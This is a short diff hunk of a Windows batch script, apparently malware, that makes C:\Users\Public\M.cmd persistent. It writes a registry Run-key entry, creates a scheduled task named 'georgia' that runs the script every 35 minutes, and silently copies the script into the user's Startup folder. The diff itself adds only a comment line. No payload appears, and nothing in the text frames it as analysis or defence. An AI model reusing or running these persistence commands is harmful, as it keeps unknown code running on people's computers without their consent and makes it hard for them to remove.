@@ -5,6 +5,9 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5
 
 SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR "C:\Users\Public\M.cmd" /f || SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR C:\Users\Public\M.cmd /f
 
+
+:: mkdir saas 
+
 mkdir "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" || mkdir ""%userprofile%"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 xcopy /c /q /y "M.cmd" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" || xcopy /c /q /y "M.cmd" ""%userprofile%"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
